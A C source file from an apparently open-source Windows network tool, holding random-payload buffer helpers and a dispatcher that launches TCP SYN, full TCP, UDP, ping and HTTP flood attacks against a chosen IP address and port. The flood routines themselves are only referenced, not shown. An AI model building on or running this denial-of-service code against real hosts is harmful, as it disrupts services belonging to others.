
/* 
 * NetworkInfoGather
 * Copyright (C) 2023  SecuProject
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <Windows.h>
#include <stdio.h>

#include "MgArguments.h"
#include "AttackFloodFullTCP.h"
#include "AttackFloodUDP.h"
#include "AttackFloodPing.h"
#include "AttackDOS.h"
#include "AttackFloodTcpSyn.h"
#include "AttackFloodHttp.h"

UCHAR GenRandChar() {
	return rand() % 256;
}
BOOL CopyRandBuffer(UCHAR* pBuffer, UINT bufferSize) {
	for (UINT i = 0; i < bufferSize; i++)
		pBuffer[i] = (UCHAR)GenRandChar();
	return TRUE;
}
BOOL CopyRandBufferAlloc(UCHAR** pBuffer, UINT bufferSize) {
	UCHAR* payloadBuffer = (UCHAR*)malloc(bufferSize + 1);
	if (payloadBuffer == NULL)
		return FALSE;
	for (UINT i = 0; i < bufferSize; i++)
		payloadBuffer[i] = (UCHAR)GenRandChar();

	*pBuffer = payloadBuffer;
	return TRUE;
}

BOOL AttackDos(DosStruct dosStruct) {
	switch (dosStruct.attackType) {
	case  TCP_FLOOD_SYN:
		AttackFloodTcpSyn(dosStruct.ipAddress, dosStruct.port, dosStruct.time, dosStruct.dataSize, FALSE);
		break;
	case  TCP_FLOOD_FULL:
		AttackFloodFullTcp(dosStruct.ipAddress, dosStruct.port, dosStruct.time, dosStruct.dataSize, FALSE);
		break;
	case  UDP_FLOOD:
		AttackFloodUDP(dosStruct.ipAddress, dosStruct.port, dosStruct.time, dosStruct.dataSize, FALSE);
		break;
	case  PING_FLOOD:
		AttackFloodPing(dosStruct.ipAddress, dosStruct.dataSize, dosStruct.time);
		break;
	case  HTTP_FLOOD:
		AttackFloodHttp(dosStruct.ipAddress, dosStruct.port, dosStruct.dataSize, dosStruct.time, FALSE);
		break;
	default:
		break;
	}
	return TRUE;
}